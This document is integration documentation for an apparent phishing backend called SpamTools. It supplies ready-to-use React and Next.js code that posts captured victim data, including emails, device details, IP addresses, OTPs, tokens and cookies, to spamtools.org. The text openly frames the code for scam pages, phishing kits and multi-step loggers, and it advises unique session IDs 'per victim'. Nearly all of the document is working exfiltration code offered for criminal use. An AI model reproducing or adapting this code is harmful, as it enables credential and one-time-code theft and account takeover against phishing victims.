# ⚙️ Advanced Data Submission (React & Next.js)

You can use SpamTools’ API not just from PHP, but also from frontend frameworks like **React** or full-stack environments like **Next.js**. Below are plug-and-play code examples to submit `data1` to `data4` dynamically.

---

## ✅ Endpoint

```
POST https://spamtools.org/wp-json/spamtools/v1/add-subscription-data
```

---

## 🧾 Fields

| Field         | Type     | Required | Description                                  |
|---------------|----------|----------|----------------------------------------------|
| `hash`        | string   | ✅        | Your subscription hash                       |
| `user_session`| string   | ✅*       | Unique session ID (auto-generated if omitted)|
| `data1`       | string   | ❌        | Any captured value (e.g., email, user)       |
| `data2`       | string   | ❌        | Browser/device info                          |
| `data3`       | string   | ❌        | IP address/location                          |
| `data4`       | string   | ❌        | OTPs, tokens, cookies, etc.                  |

> ⚠️ Only `data1` to `data4` are accepted. Extra fields will be ignored.

---

## 💻 React: Frontend Version

Use this in any **React-based scam page or phishing UI**.

```js
// utils/sendToSpamTools.js

export async function sendToSpamTools(hash, dataFields, userSession = null) {
  if (!hash) return console.error("❌ Subscription hash is required.");

  const allowed = ['data1', 'data2', 'data3', 'data4'];
  const filtered = {};

  allowed.forEach((key) => {
    if (dataFields[key]) filtered[key] = dataFields[key];
  });

  if (Object.keys(filtered).length === 0) {
    return console.error("❌ At least one of data1–data4 is required.");
  }

  const payload = {
    hash,
    user_session: userSession || `session_${Date.now()}_${Math.random().toString(36).substring(2)}`,
    ...filtered,
  };

  try {
    const res = await fetch("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    const data = await res.json();

    if (res.status === 200) {
      console.log("✅ Data sent successfully.");
    } else {
      console.error(`❌ Error [${res.status}]:`, data);
    }
  } catch (err) {
    console.error("❌ Network error:", err);
  }
}
```

### 🔧 Example Usage in React

```js
sendToSpamTools("abc123hash", {
  data1: "Email: user@example.com",
  data2: "Browser: Chrome"
});
```

---

## 🖥️ Next.js: API Route (Server-Side)

Use this to relay phishing/scam data from your own **Next.js server/backend**.

```js
// pages/api/send-log.js

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed." });
  }

  const { hash, data1, data2, data3, data4, user_session } = req.body;

  if (!hash) {
    return res.status(400).json({ error: "Subscription hash required." });
  }

  const payload = {
    hash,
    user_session: user_session || `session_${Date.now()}_${Math.random().toString(36).substring(2)}`
  };

  ["data1", "data2", "data3", "data4"].forEach((key) => {
    if (req.body[key]) payload[key] = req.body[key];
  });

  if (Object.keys(payload).length <= 2) {
    return res.status(400).json({ error: "No valid data fields found." });
  }

  try {
    const apiRes = await fetch("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const result = await apiRes.json();

    return res.status(apiRes.status).json(result);
  } catch (err) {
    return res.status(500).json({ error: "Internal error", detail: err.message });
  }
}
```

---

### 🔧 Example Usage (Client to API Route)

```js
await fetch("/api/send-log", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    hash: "abc123hash",
    data2: "Browser: Safari",
    data4: "OTP: 372818"
  }),
});
```

---

## 📌 Tips

- `user_session` lets you append data across multiple steps. Always use unique IDs per victim.
- You can omit `user_session` and SpamTools will auto-generate one inside the function.
- This is ideal for dynamic kits that send partial data at different stages (multi-step phishing, modal-based loggers, etc).

---


